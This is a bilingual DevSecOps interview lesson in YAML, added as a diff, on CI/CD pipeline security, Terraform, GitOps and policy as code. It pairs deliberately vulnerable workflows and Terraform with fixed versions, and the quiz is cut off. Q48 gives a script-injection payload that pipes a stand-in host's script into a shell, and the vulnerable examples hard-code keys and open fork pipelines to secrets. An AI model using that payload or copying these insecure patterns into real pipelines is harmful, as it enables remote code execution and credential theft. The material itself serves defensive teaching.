@@ -1,0 +1,747 @@
+description:
+  fr: "Questions d'entretien 41 à 60 : pipelines CI/CD, sécurité de la chaîne de build, Terraform, GitOps et policy as code, avec des revues de pipeline et de code Terraform vulnérables."
+  en: "Interview questions 41 to 60: CI/CD pipelines, build chain security, Terraform, GitOps and policy as code, with reviews of vulnerable pipelines and Terraform code."
+duration: 50
+
+intro:
+  fr: |
+    Le pipeline **CI/CD** (Continuous Integration / Continuous Delivery, intégration et livraison
+    continues) et l'**IaC** (Infrastructure as Code, l'infrastructure décrite dans des fichiers) sont le
+    cœur du métier DevSecOps. Le pipeline est comme le tapis roulant d'une usine : tout ce qui arrive en
+    production passe dessus. Celui qui contrôle le tapis contrôle l'usine ; c'est pourquoi les
+    attaquants le visent, et pourquoi les recruteurs y consacrent une grande partie de l'entretien.
+
+    Cette leçon couvre les **questions 41 à 60**. L'exercice le plus fréquent est la **revue de code** :
+    on vous montre un workflow GitHub Actions ou un fichier Terraform et l'on vous demande « qu'est-ce
+    qui ne va pas ? ». Vous trouverez ici les deux, en version vulnérable puis corrigée.
+
+    Méthode pour ces revues : lisez dans l'ordre **déclencheurs, permissions, secrets, dépendances
+    externes, entrées non fiables**, et annoncez chaque problème avec son impact et sa correction.
+  en: |
+    The **CI/CD** (Continuous Integration / Continuous Delivery) pipeline and **IaC** (Infrastructure as
+    Code, infrastructure described in files) are the heart of the DevSecOps job. The pipeline is like a
+    factory conveyor belt: everything that reaches production travels on it. Whoever controls the belt
+    controls the factory; that is why attackers target it, and why interviewers spend a large part of
+    the interview on it.
+
+    This lesson covers **questions 41 to 60**. The most frequent exercise is a **code review**: you are
+    shown a GitHub Actions workflow or a Terraform file and asked "what is wrong here?". You will find
+    both below, vulnerable then fixed.
+
+    A method for these reviews: read in the order **triggers, permissions, secrets, external
+    dependencies, untrusted input**, and state each problem with its impact and its fix.
+
+sections:
+  - heading:
+      fr: "Questions 41 à 45 : les bases du CI/CD"
+      en: "Questions 41 to 45: CI/CD basics"
+    body:
+      fr: |
+        **Q41. Différence entre intégration continue, livraison continue et déploiement continu ?** *(junior)*
+
+        | Pratique | Ce qui est automatisé | Mise en production |
+        |---|---|---|
+        | Intégration continue (CI) | Build et tests à chaque commit | Non concernée |
+        | Livraison continue | Tout jusqu'à un artefact prêt à déployer | Déclenchée par une validation humaine |
+        | Déploiement continu | Tout, y compris la mise en production | Automatique si les contrôles passent |
+
+        **Q42. Quelles étapes de sécurité placez-vous dans un pipeline ?** *(junior)*
+
+        Avant le commit : hooks de détection de secrets. Sur chaque pull request : détection de secrets,
+        SAST, SCA, scan de l'IaC. Au build : scan de l'image et génération du SBOM. Sur l'environnement de
+        test : DAST. Avant le déploiement : signature de l'artefact et vérification des politiques. En
+        production : surveillance et détection. Les contrôles rapides bloquent, les contrôles lents
+        tournent en parallèle ou de nuit.
+
+        **Q43. Comment gérez-vous les secrets dans un pipeline ?** *(confirmé)*
+
+        Ils sont stockés dans le coffre de la plateforme de CI ou, mieux, dans un gestionnaire externe
+        (Vault, coffre du cloud), limités par environnement et par branche protégée. Ils sont injectés
+        comme variables **masquées** dans la seule étape qui en a besoin, jamais affichés ni passés en
+        argument de ligne de commande. Quand c'est possible, je supprime le secret : fédération **OIDC**
+        entre la CI et le cloud pour obtenir des identifiants temporaires.
+
+        **Q44. Pourquoi épingler une action GitHub par son SHA plutôt que par un tag ?** *(confirmé)*
+
+        Un tag comme `v4` est **mutable** : si le dépôt de l'action est compromis, l'attaquant peut
+        déplacer le tag vers du code malveillant, qui s'exécutera avec vos secrets. Un SHA de commit
+        complet est immuable. On garde le tag en commentaire et on laisse Dependabot ou Renovate proposer
+        les mises à jour.
+
+        **Q45. Sur quels critères faites-vous échouer un build ?** *(confirmé)*
+
+        Je bloque sur ce qui est **grave, nouveau et corrigeable** : secret détecté, vulnérabilité
+        critique ou haute avec correctif disponible introduite par le changement, règle d'IaC critique
+        (ressource publique, absence de chiffrement). Le reste est signalé sans bloquer et suivi avec un
+        délai. Toute exception est explicite, justifiée, versionnée et limitée dans le temps.
+      en: |
+        **Q41. Difference between continuous integration, continuous delivery and continuous deployment?** *(junior)*
+
+        | Practice | What is automated | Release to production |
+        |---|---|---|
+        | Continuous integration (CI) | Build and tests on every commit | Not covered |
+        | Continuous delivery | Everything up to a deployable artifact | Triggered by a human approval |
+        | Continuous deployment | Everything, including the production release | Automatic if the checks pass |
+
+        **Q42. Which security stages do you put in a pipeline?** *(junior)*
+
+        Before the commit: secret-detection hooks. On every pull request: secret detection, SAST, SCA, IaC
+        scanning. At build: image scan and SBOM generation. On the test environment: DAST. Before
+        deployment: artifact signing and policy verification. In production: monitoring and detection.
+        Fast checks block, slow checks run in parallel or nightly.
+
+        **Q43. How do you manage secrets in a pipeline?** *(mid)*
+
+        They are stored in the CI platform's secret store or, better, in an external manager (Vault, the
+        cloud vault), scoped per environment and per protected branch. They are injected as **masked**
+        variables into the only step that needs them, never printed nor passed as command-line arguments.
+        Whenever possible I remove the secret altogether: **OIDC** federation between CI and the cloud to
+        get temporary credentials.
+
+        **Q44. Why pin a GitHub Action by its SHA rather than by a tag?** *(mid)*
+
+        A tag like `v4` is **mutable**: if the action's repository is compromised, the attacker can move
+        the tag to malicious code, which will run with your secrets. A full commit SHA is immutable. You
+        keep the tag as a comment and let Dependabot or Renovate propose updates.
+
+        **Q45. On which criteria do you fail a build?** *(mid)*
+
+        I block on what is **severe, new and fixable**: a detected secret, a critical or high
+        vulnerability with an available fix introduced by the change, a critical IaC rule (public
+        resource, missing encryption). The rest is reported without blocking and tracked with a deadline.
+        Every exception is explicit, justified, versioned and time-limited.
+  - heading:
+      fr: "Questions 46 à 50 : sécurité du pipeline lui-même"
+      en: "Questions 46 to 50: security of the pipeline itself"
+    body:
+      fr: |
+        **Q46. Comment un pipeline s'authentifie-t-il auprès du cloud sans clé longue durée ?** *(senior)*
+
+        Par fédération **OIDC** (OpenID Connect). La plateforme de CI émet un jeton signé décrivant le
+        job (dépôt, branche, environnement). Le cloud fait confiance à cet émetteur et échange le jeton
+        contre des identifiants **temporaires** pour un rôle précis, à condition que les revendications
+        correspondent, par exemple « dépôt X, branche main ». Il n'y a plus de clé à stocker, à faire
+        tourner ni à voler.
+
+        **Q47. Quels sont les risques des runners auto-hébergés ?** *(senior)*
+
+        Ils exécutent du code arbitraire (celui du dépôt et de ses dépendances) à l'intérieur de votre
+        réseau. S'ils sont **persistants**, un job malveillant peut laisser une porte dérobée, voler les
+        identifiants du job suivant ou empoisonner le cache. On les rend éphémères (une machine neuve par
+        job), isolés du réseau, sans privilèges, et on ne les expose jamais aux pull requests venant de
+        forks publics.
+
+        **Q48. Qu'est-ce qu'une injection de script dans GitHub Actions ?** *(senior)*
+
+        L'expression `${{ ... }}` est remplacée **avant** l'exécution du shell. Si l'on écrit
+        `run: echo "${{ github.event.pull_request.title }}"`, un titre de pull request contenant
+        `"; curl https://evil.example | sh; "` devient une commande. Correction : passer la valeur par une
+        variable d'environnement (`env:`) et la citer comme `"$TITLE"`. Le déclencheur
+        `pull_request_target` aggrave le risque, car il s'exécute avec les secrets du dépôt cible.
+
+        **Q49. Comment garantissez-vous qu'une image déployée vient bien de votre pipeline ?** *(senior)*
+
+        Le pipeline **signe** l'image par son condensé (Sigstore Cosign, signature sans clé liée à
+        l'identité OIDC du job) et publie une attestation de **provenance** (référentiel SLSA). Le
+        cluster vérifie la signature à l'admission (Kyverno, policy controller de Sigstore) et refuse
+        toute image non signée ou signée par une autre identité. On déploie par **digest**, pas par tag.
+
+        **Q50. Qu'est-ce qu'une attaque par confusion de dépendances ?** *(senior)*
+
+        L'attaquant publie sur un registre **public** un paquet portant le même nom qu'un paquet
+        **interne**, avec un numéro de version plus élevé. Un gestionnaire de paquets mal configuré
+        préfère la version publique et exécute le code de l'attaquant au build. Parades : noms à portée
+        réservée (*scopes*, espaces de noms), registre interne configuré comme source unique, fichiers de
+        verrouillage avec condensés.
+      en: |
+        **Q46. How does a pipeline authenticate to the cloud without a long-lived key?** *(senior)*
+
+        Through **OIDC** (OpenID Connect) federation. The CI platform issues a signed token describing
+        the job (repository, branch, environment). The cloud trusts that issuer and exchanges the token
+        for **temporary** credentials on a specific role, provided the claims match, for example
+        "repository X, branch main". There is no key left to store, rotate or steal.
+
+        **Q47. What are the risks of self-hosted runners?** *(senior)*
+
+        They run arbitrary code (the repository's and its dependencies') inside your network. If they are
+        **persistent**, a malicious job can leave a backdoor, steal the next job's credentials or poison
+        the cache. Make them ephemeral (a fresh machine per job), network-isolated, unprivileged, and
+        never expose them to pull requests coming from public forks.
+
+        **Q48. What is script injection in GitHub Actions?** *(senior)*
+
+        The `${{ ... }}` expression is substituted **before** the shell runs. If you write
+        `run: echo "${{ github.event.pull_request.title }}"`, a pull request title containing
+        `"; curl https://evil.example | sh; "` becomes a command. Fix: pass the value through an
+        environment variable (`env:`) and quote it as `"$TITLE"`. The `pull_request_target` trigger makes
+        it worse, because it runs with the target repository's secrets.
+
+        **Q49. How do you guarantee that a deployed image really comes from your pipeline?** *(senior)*
+
+        The pipeline **signs** the image by digest (Sigstore Cosign, keyless signing bound to the job's
+        OIDC identity) and publishes a **provenance** attestation (SLSA framework). The cluster verifies
+        the signature at admission (Kyverno, Sigstore policy controller) and rejects any image that is
+        unsigned or signed by another identity. You deploy by **digest**, not by tag.
+
+        **Q50. What is a dependency confusion attack?** *(senior)*
+
+        The attacker publishes on a **public** registry a package with the same name as an **internal**
+        package, with a higher version number. A badly configured package manager prefers the public
+        version and runs the attacker's code at build time. Defences: scoped names (namespaces), the
+        internal registry configured as the single source, lock files with hashes.
+  - heading:
+      fr: "Questions 51 à 55 : Infrastructure as Code et Terraform"
+      en: "Questions 51 to 55: Infrastructure as Code and Terraform"
+    body:
+      fr: |
+        **Q51. Qu'apporte l'Infrastructure as Code à la sécurité ?** *(junior)*
+
+        L'infrastructure devient du texte **versionné** : chaque changement est relu en pull request,
+        tracé dans Git, testable et reproductible. On peut scanner la configuration **avant** qu'elle
+        n'existe, reconstruire un environnement à l'identique après un incident, et détecter les écarts
+        entre le code et la réalité. Le déclaratif (Terraform) décrit l'état voulu ; l'outil calcule les
+        actions, de façon idempotente.
+
+        **Q52. Que contient le fichier d'état Terraform et comment le protégez-vous ?** *(confirmé)*
+
+        Le *state* fait la correspondance entre le code et les ressources réelles, et contient leurs
+        attributs **en clair**, y compris des mots de passe et des clés. Il ne va donc jamais dans Git.
+        On le stocke dans un backend distant chiffré (S3, Azure Storage, HCP Terraform) avec un accès
+        restreint, le versionnement activé et un **verrouillage** pour éviter deux `apply` simultanés.
+
+        **Q53. Qu'est-ce que la dérive (drift) et comment la gérez-vous ?** *(confirmé)*
+
+        C'est l'écart entre l'infrastructure réelle et le code, causé le plus souvent par une modification
+        manuelle dans la console. Je la détecte avec un `terraform plan` planifié (ou
+        `terraform plan -refresh-only`), puis je décide : soit on réapplique le code, soit on intègre le
+        changement dans le code. Pour la prévenir : droits en écriture réservés au pipeline, accès
+        humains en lecture seule.
+
+        **Q54. Comment analysez-vous la sécurité d'un code Terraform ?** *(confirmé)*
+
+        Avec un scanner d'IaC dans la pull request : **Checkov**, **Trivy** (`trivy config`, qui a succédé
+        à tfsec) ou KICS. Ils détectent les ressources publiques, l'absence de chiffrement, les règles
+        réseau trop ouvertes. Je scanne aussi le **plan** exporté en JSON, qui contient les valeurs
+        résolues des variables et des modules. Les exceptions sont des annotations justifiées dans le
+        code.
+
+        **Q55. Pourquoi versionner les modules et les providers ?** *(confirmé)*
+
+        Sans contrainte de version, un `terraform init` peut télécharger demain un code différent de
+        celui que vous avez testé : régression ou module compromis. On fixe la version des modules
+        (`version = "..."` ou référence Git précise), on contraint les providers dans `required_providers`
+        et on **commite** le fichier `.terraform.lock.hcl`, qui enregistre les condensés des providers.
+      en: |
+        **Q51. What does Infrastructure as Code bring to security?** *(junior)*
+
+        Infrastructure becomes **versioned** text: every change is reviewed in a pull request, traced in
+        Git, testable and reproducible. You can scan the configuration **before** it exists, rebuild an
+        identical environment after an incident, and detect gaps between code and reality. Declarative
+        tools (Terraform) describe the desired state; the tool computes the actions, idempotently.
+
+        **Q52. What does the Terraform state file contain and how do you protect it?** *(mid)*
+
+        The state maps the code to real resources and holds their attributes **in clear text**, including
+        passwords and keys. So it never goes into Git. It is stored in an encrypted remote backend (S3,
+        Azure Storage, HCP Terraform) with restricted access, versioning enabled and **locking** to
+        prevent two simultaneous `apply` runs.
+
+        **Q53. What is drift and how do you handle it?** *(mid)*
+
+        It is the gap between the real infrastructure and the code, most often caused by a manual change
+        in the console. I detect it with a scheduled `terraform plan` (or
+        `terraform plan -refresh-only`), then decide: either re-apply the code, or bring the change into
+        the code. To prevent it: write permissions reserved for the pipeline, read-only access for humans.
+
+        **Q54. How do you analyse the security of Terraform code?** *(mid)*
+
+        With an IaC scanner in the pull request: **Checkov**, **Trivy** (`trivy config`, the successor of
+        tfsec) or KICS. They detect public resources, missing encryption, over-permissive network rules.
+        I also scan the **plan** exported as JSON, which holds the resolved values of variables and
+        modules. Exceptions are justified annotations in the code.
+
+        **Q55. Why pin module and provider versions?** *(mid)*
+
+        Without a version constraint, a `terraform init` may tomorrow download code that differs from
+        what you tested: a regression or a compromised module. You pin module versions
+        (`version = "..."` or a precise Git reference), constrain providers in `required_providers` and
+        **commit** the `.terraform.lock.hcl` file, which records provider checksums.
+  - heading:
+      fr: "Questions 56 à 60 : GitOps, politiques et déploiement"
+      en: "Questions 56 to 60: GitOps, policies and deployment"
+    body:
+      fr: |
+        **Q56. Qu'est-ce que le GitOps ?** *(confirmé)*
+
+        Git est la **source de vérité unique** de l'état désiré, et un agent dans le cluster (Argo CD,
+        Flux) **tire** cet état et le réconcilie en continu. Avantages pour la sécurité : le pipeline n'a
+        plus besoin d'identifiants d'administration du cluster, chaque changement passe par une pull
+        request, le retour arrière est un `git revert`, et toute modification manuelle est détectée et
+        corrigée.
+
+        **Q57. Qu'est-ce que la « policy as code » ?** *(confirmé)*
+
+        Des règles de sécurité écrites dans un langage, versionnées, testées et évaluées automatiquement :
+        **OPA/Rego** avec Conftest sur un plan Terraform, **Kyverno** ou Gatekeeper à l'admission
+        Kubernetes, Sentinel dans HCP Terraform. Exemple : « aucun groupe de sécurité n'ouvre le port 22 à
+        Internet ». La règle remplace une relecture manuelle et s'applique à toutes les équipes de la
+        même façon.
+
+        **Q58. Terraform ou Ansible ?** *(junior)*
+
+        Terraform est déclaratif et suit un état : il excelle pour **provisionner** l'infrastructure
+        (réseaux, machines, services managés). Ansible est procédural, sans agent, par SSH : il excelle
+        pour **configurer** ce qui tourne dans les machines (paquets, fichiers, services). On les combine
+        souvent, ou l'on remplace la configuration par des images immuables construites avec Packer.
+
+        **Q59. Comment manipulez-vous un secret dans Terraform ?** *(senior)*
+
+        Jamais en dur ni dans un fichier `.tfvars` commité. La valeur vient d'une variable marquée
+        `sensitive = true` (masquée dans les sorties) fournie par la CI, ou mieux d'une source de données
+        d'un gestionnaire de secrets. Attention : `sensitive` **ne chiffre pas** le state, la valeur y
+        reste lisible. L'idéal est que le service génère et gère lui-même le secret (mot de passe géré par
+        le cloud, rotation automatique), pour qu'il ne transite pas par Terraform.
+
+        **Q60. Quelles stratégies de déploiement réduisent le risque ?** *(confirmé)*
+
+        | Stratégie | Principe | Retour arrière |
+        |---|---|---|
+        | Rolling update | Remplacement progressif des instances | Lent : nouveau déploiement |
+        | Blue/green | Deux environnements complets, bascule du trafic | Immédiat : on rebascule |
+        | Canary | Petit pourcentage du trafic sur la nouvelle version | Rapide : on coupe le canari |
+
+        Les *feature flags* séparent en plus le déploiement du code de l'activation de la fonctionnalité.
+      en: |
+        **Q56. What is GitOps?** *(mid)*
+
+        Git is the **single source of truth** for the desired state, and an agent in the cluster (Argo CD,
+        Flux) **pulls** that state and reconciles it continuously. Security benefits: the pipeline no
+        longer needs cluster-admin credentials, every change goes through a pull request, rollback is a
+        `git revert`, and any manual change is detected and corrected.
+
+        **Q57. What is "policy as code"?** *(mid)*
+
+        Security rules written in a language, versioned, tested and evaluated automatically: **OPA/Rego**
+        with Conftest on a Terraform plan, **Kyverno** or Gatekeeper at Kubernetes admission, Sentinel in
+        HCP Terraform. Example: "no security group opens port 22 to the Internet". The rule replaces a
+        manual review and applies to every team the same way.
+
+        **Q58. Terraform or Ansible?** *(junior)*
+
+        Terraform is declarative and tracks state: it excels at **provisioning** infrastructure
+        (networks, machines, managed services). Ansible is procedural, agentless, over SSH: it excels at
+        **configuring** what runs inside machines (packages, files, services). They are often combined,
+        or configuration is replaced by immutable images built with Packer.
+
+        **Q59. How do you handle a secret in Terraform?** *(senior)*
+
+        Never hard-coded nor in a committed `.tfvars` file. The value comes from a variable marked
+        `sensitive = true` (masked in output) supplied by CI, or better from a secrets manager data
+        source. Beware: `sensitive` does **not encrypt** the state, the value stays readable there.
+        Ideally the service generates and manages the secret itself (cloud-managed password, automatic
+        rotation), so that it never travels through Terraform.
+
+        **Q60. Which deployment strategies reduce risk?** *(mid)*
+
+        | Strategy | Principle | Rollback |
+        |---|---|---|
+        | Rolling update | Instances replaced progressively | Slow: a new rollout |
+        | Blue/green | Two full environments, traffic switch | Immediate: switch back |
+        | Canary | A small share of traffic on the new version | Fast: stop the canary |
+
+        *Feature flags* additionally separate deploying the code from enabling the feature.
+
+examples:
+  - title:
+      fr: "Question en direct : « Qu'est-ce qui ne va pas dans ce pipeline ? »"
+      en: "Live question: \"What is wrong with this pipeline?\""
+    file: .github/workflows/deploy.yml
+    lang: yaml
+    kind: vulnerable
+    code: |
+      name: deploy
+
+      # Problem 1: runs code from forks WITH the secrets of this repository
+      on: pull_request_target
+
+      # Problem 2: the token can write to everything (contents, packages, issues...)
+      permissions: write-all
+
+      jobs:
+        deploy:
+          runs-on: ubuntu-latest
+          steps:
+            # Problem 3: mutable tag + checkout of untrusted fork code
+            - uses: actions/checkout@v4
+              with:
+                ref: ${{ github.event.pull_request.head.sha }}
+
+            # Problem 4: script injection - the PR title is pasted into the shell command
+            - run: echo "Deploying ${{ github.event.pull_request.title }}"
+
+            # Problem 5: long-lived cloud keys, exposed to every command below
+            - run: ./deploy.sh
+              env:
+                AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+                AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+
+            # Problem 6: remote script piped into a shell, no integrity check
+            - run: curl -s https://example.com/install.sh | bash
+    note:
+      fr: "Six problèmes. Le plus grave est la combinaison `pull_request_target` + checkout du code du fork : n'importe quel inconnu peut ouvrir une pull request qui exécute son code avec vos clés AWS."
+      en: "Six problems. The worst is the combination of `pull_request_target` + checking out the fork's code: any stranger can open a pull request that runs their code with your AWS keys."
+
+  - title:
+      fr: "Le même pipeline, corrigé"
+      en: "The same pipeline, fixed"
+    file: .github/workflows/deploy.yml
+    lang: yaml
+    kind: secure
+    code: |
+      name: deploy
+
+      # Deploy only from the protected main branch; pull requests get a separate, secret-less workflow
+      on:
+        push:
+          branches: [main]
+
+      # Deny by default, then grant per job
+      permissions: {}
+
+      jobs:
+        deploy:
+          runs-on: ubuntu-latest
+          environment: production # required reviewers + environment-scoped secrets
+          permissions:
+            contents: read
+            id-token: write # needed to request the OIDC token
+          steps:
+            # Pinned by full commit SHA; the tag is kept as a comment for humans
+            - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+              with:
+                persist-credentials: false
+
+            # Untrusted text goes through an environment variable, never into the script itself
+            - name: Show commit message
+              env:
+                COMMIT_MESSAGE: ${{ github.event.head_commit.message }}
+              run: echo "Deploying: $COMMIT_MESSAGE"
+
+            # OIDC federation: temporary credentials, no stored cloud key.
+            # Pin this action by commit SHA as well in a real repository.
+            - uses: aws-actions/configure-aws-credentials@v4
+              with:
+                role-to-assume: arn:aws:iam::123456789012:role/github-deploy-prod
+                aws-region: eu-west-3
+
+            - run: ./deploy.sh
+    note:
+      fr: "Déclencheur restreint, permissions minimales par job, action épinglée par SHA, entrée non fiable passée par `env`, OIDC à la place des clés. Côté AWS, la politique de confiance du rôle doit limiter le `sub` du jeton à ce dépôt et à cet environnement."
+      en: "Restricted trigger, minimal per-job permissions, action pinned by SHA, untrusted input passed through `env`, OIDC instead of keys. On the AWS side, the role's trust policy must restrict the token's `sub` claim to this repository and environment."
+
+  - title:
+      fr: "Question en direct : « Qu'est-ce qui ne va pas dans ce Terraform ? »"
+      en: "Live question: \"What is wrong with this Terraform?\""
+    file: main.tf
+    lang: hcl
+    kind: vulnerable
+    code: |
+      provider "aws" {
+        region = "eu-west-3"
+        # Problem 1: credentials hard-coded in Git
+        access_key = "AKIAIOSFODNN7EXAMPLE"
+        secret_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+      }
+
+      resource "aws_security_group" "db" {
+        name   = "db"
+        vpc_id = var.vpc_id
+
+        # Problem 2: PostgreSQL reachable from the whole Internet
+        ingress {
+          from_port   = 5432
+          to_port     = 5432
+          protocol    = "tcp"
+          cidr_blocks = ["0.0.0.0/0"]
+        }
+      }
+
+      resource "aws_db_instance" "main" {
+        identifier        = "app-db"
+        engine            = "postgres"
+        instance_class    = "db.t3.micro"
+        allocated_storage = 20
+        username          = "admin"
+        # Problem 3: password in clear text in the code (and in the state)
+        password = "SuperSecret123!"
+        # Problem 4: public endpoint, no encryption at rest, no backups, no final snapshot
+        publicly_accessible     = true
+        storage_encrypted       = false
+        backup_retention_period = 0
+        skip_final_snapshot     = true
+        vpc_security_group_ids  = [aws_security_group.db.id]
+      }
+    note:
+      fr: "Annoncez les problèmes par gravité : identifiants dans Git, base exposée à Internet, mot de passe en clair, ni chiffrement ni sauvegardes. Ajoutez ce qui **manque** : pas de backend distant, pas de version de provider."
+      en: "State the problems by severity: credentials in Git, database exposed to the Internet, clear-text password, neither encryption nor backups. Add what is **missing**: no remote backend, no provider version."
+
+  - title:
+      fr: "Le même Terraform, corrigé"
+      en: "The same Terraform, fixed"
+    file: main.tf
+    lang: hcl
+    kind: secure
+    code: |
+      terraform {
+        required_version = ">= 1.10"
+
+        required_providers {
+          aws = {
+            source  = "hashicorp/aws"
+            version = "~> 6.0" # constrained; exact checksums live in .terraform.lock.hcl
+          }
+        }
+
+        # Remote state: encrypted, versioned bucket, with locking
+        backend "s3" {
+          bucket       = "example-tfstate-prod"
+          key          = "app/terraform.tfstate"
+          region       = "eu-west-3"
+          encrypt      = true
+          use_lockfile = true
+        }
+      }
+
+      # No credentials here: they come from the environment (OIDC role in CI)
+      provider "aws" {
+        region = "eu-west-3"
+      }
+
+      resource "aws_security_group" "db" {
+        name   = "db"
+        vpc_id = var.vpc_id
+
+        # Only the application's security group may reach PostgreSQL
+        ingress {
+          from_port       = 5432
+          to_port         = 5432
+          protocol        = "tcp"
+          security_groups = [var.app_security_group_id]
+        }
+      }
+
+      resource "aws_db_instance" "main" {
+        identifier        = "app-db"
+        engine            = "postgres"
+        instance_class    = "db.t3.micro"
+        allocated_storage = 20
+        username          = "app_admin"
+
+        # RDS generates the password and stores it in Secrets Manager: it never appears in code
+        manage_master_user_password = true
+
+        publicly_accessible       = false
+        storage_encrypted         = true
+        backup_retention_period   = 7
+        deletion_protection       = true
+        skip_final_snapshot       = false
+        final_snapshot_identifier = "app-db-final"
+        vpc_security_group_ids    = [aws_security_group.db.id]
+      }
+    note:
+      fr: "Le mot de passe n'existe plus dans le code : `manage_master_user_password` le confie à Secrets Manager. `use_lockfile` (Terraform 1.10 et plus) remplace l'ancienne table DynamoDB pour le verrouillage du state S3. Relancez ensuite `checkov -d .` ou `trivy config .` pour vérifier ce qu'il reste à durcir."
+      en: "The password no longer exists in code: `manage_master_user_password` hands it to Secrets Manager. `use_lockfile` (Terraform 1.10 and later) replaces the former DynamoDB table for S3 state locking. Then run `checkov -d .` or `trivy config .` again to see what is left to harden."
+
+mistake:
+  fr: |
+    **Ne voir que le problème le plus évident et s'arrêter là.**
+
+    Dans une revue de pipeline ou de Terraform, la plupart des candidats repèrent le mot de passe en dur
+    et s'arrêtent, satisfaits. Le recruteur a placé cinq ou six problèmes, de gravités différentes, pour
+    mesurer votre **méthode**. Parcourez le fichier systématiquement (déclencheurs, permissions, secrets,
+    dépendances, entrées, ressources exposées, chiffrement, sauvegardes), puis **classez** vos remarques
+    par gravité.
+
+    Autre erreur : proposer « on ajoute un scanner » comme seule réponse. Un scanner détecte, il ne
+    remplace pas la compréhension de la faille ni la correction.
+  en: |
+    **Seeing only the most obvious problem and stopping there.**
+
+    In a pipeline or Terraform review, most candidates spot the hard-coded password and stop, satisfied.
+    The interviewer planted five or six problems, of different severities, to measure your **method**.
+    Walk through the file systematically (triggers, permissions, secrets, dependencies, inputs, exposed
+    resources, encryption, backups), then **rank** your remarks by severity.
+
+    Another mistake: offering "let's add a scanner" as the only answer. A scanner detects; it replaces
+    neither understanding the flaw nor fixing it.
+
+bestPractice:
+  fr: |
+    - **Pour chaque problème, donnez trois éléments** : ce que c'est, ce qu'un attaquant en ferait,
+      comment on le corrige.
+    - **Citez ce qui manque**, pas seulement ce qui est faux : pas de `permissions`, pas de backend, pas
+      de contrainte de version, pas de revue obligatoire.
+    - **Distinguez prévention et détection** : la policy as code empêche, le scan planifié détecte la
+      dérive.
+    - **Connaissez un exemple réel** d'attaque de la chaîne d'approvisionnement (SolarWinds, Codecov,
+      l'action `tj-actions/changed-files` en 2025) et la leçon que vous en tirez.
+    - **Restez pragmatique** : dites ce que vous feriez la première semaine et ce que vous planifieriez
+      sur le trimestre.
+  en: |
+    - **For each problem give three things**: what it is, what an attacker would do with it, how to fix
+      it.
+    - **Name what is missing**, not only what is wrong: no `permissions`, no backend, no version
+      constraint, no mandatory review.
+    - **Separate prevention from detection**: policy as code prevents, the scheduled scan detects drift.
+    - **Know one real example** of a supply chain attack (SolarWinds, Codecov, the
+      `tj-actions/changed-files` action in 2025) and the lesson you draw from it.
+    - **Stay pragmatic**: say what you would do in the first week and what you would plan over the
+      quarter.
+
+exercise:
+  statement:
+    fr: |
+      Voici un pipeline GitLab CI. Trouvez les **quatre** problèmes de sécurité et réécrivez-le.
+
+      ```yaml
+      deploy:
+        image: alpine:latest
+        script:
+          - echo "Token is $DEPLOY_TOKEN"
+          - apk add --no-cache curl
+          - 'curl -k -H "Authorization: Bearer $DEPLOY_TOKEN" https://deploy.example.com/release'
+        variables:
+          DB_PASSWORD: "Pr0d-P@ssw0rd"
+      ```
+
+      Indice : regardez l'image, ce qui est affiché dans les journaux, les options de `curl`, les
+      variables, et **quand** le job s'exécute.
+    en: |
+      Here is a GitLab CI pipeline. Find the **four** security problems and rewrite it.
+
+      ```yaml
+      deploy:
+        image: alpine:latest
+        script:
+          - echo "Token is $DEPLOY_TOKEN"
+          - apk add --no-cache curl
+          - 'curl -k -H "Authorization: Bearer $DEPLOY_TOKEN" https://deploy.example.com/release'
+        variables:
+          DB_PASSWORD: "Pr0d-P@ssw0rd"
+      ```
+
+      Hint: look at the image, what is printed in the logs, the `curl` options, the variables, and
+      **when** the job runs.
+  solution:
+    file: .gitlab-ci.yml
+    lang: yaml
+    code: |
+      deploy:
+        # Fix 1: pinned image version instead of the mutable "latest" tag
+        image: alpine:3.21
+        # Fix 4 (bonus): deploy only from the protected default branch, in a tracked environment
+        rules:
+          - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+        environment: production
+        script:
+          # Fix 2: the token is never echoed to the job log
+          - apk add --no-cache curl
+          # Fix 3: no "-k" - TLS certificate verification stays enabled; --fail makes HTTP errors fail the job
+          - 'curl --fail -H "Authorization: Bearer $DEPLOY_TOKEN" https://deploy.example.com/release'
+        # Fix 4: no secret in the file - DEPLOY_TOKEN and DB_PASSWORD are defined in
+        # Settings > CI/CD > Variables as "Masked" and "Protected" variables
+    note:
+      fr: "Les quatre problèmes : image `latest` mutable, jeton affiché dans les journaux, `curl -k` qui désactive la vérification TLS, mot de passe de production en clair dans le dépôt. En bonus, le job s'exécutait sur toutes les branches."
+      en: "The four problems: mutable `latest` image, token printed in the logs, `curl -k` disabling TLS verification, production password in clear text in the repository. As a bonus, the job ran on every branch."
+
+quiz:
+  - q:
+      fr: "Pourquoi `run: echo \"${{ github.event.pull_request.title }}\"` est-il dangereux ?"
+      en: "Why is `run: echo \"${{ github.event.pull_request.title }}\"` dangerous?"
+    options:
+      fr:
+        - "Parce que `echo` est une commande obsolète"
+        - "Parce que le titre est inséré dans le script avant son exécution : c'est une injection de commande"
+        - "Parce que le titre peut dépasser la taille maximale d'une variable"
+        - "Parce que les journaux de GitHub Actions sont toujours publics"
+      en:
+        - "Because `echo` is a deprecated command"
+        - "Because the title is inserted into the script before it runs: it is a command injection"
+        - "Because the title may exceed the maximum size of a variable"
+        - "Because GitHub Actions logs are always public"
+    answer: 1
+    why:
+      fr: "L'expression est remplacée avant que le shell ne s'exécute ; un titre malveillant devient du code. On passe la valeur par `env:` et on l'utilise comme `\"$TITLE\"`."
+      en: "The expression is substituted before the shell runs; a malicious title becomes code. Pass the value through `env:` and use it as `\"$TITLE\"`."
+  - q:
+      fr: "Quel est l'avantage principal de la fédération OIDC entre la CI et le cloud ?"
+      en: "What is the main benefit of OIDC federation between CI and the cloud?"
+    options:
+      fr:
+        - "Les builds sont plus rapides"
+        - "Les journaux sont chiffrés"
+        - "Le pipeline n'a plus besoin de permissions"
+        - "Il n'y a plus de clé longue durée à stocker : les identifiants sont temporaires"
+      en:
+        - "Builds are faster"
+        - "Logs are encrypted"
+        - "The pipeline no longer needs permissions"
+        - "There is no long-lived key to store any more: credentials are temporary"
+    answer: 3
+    why:
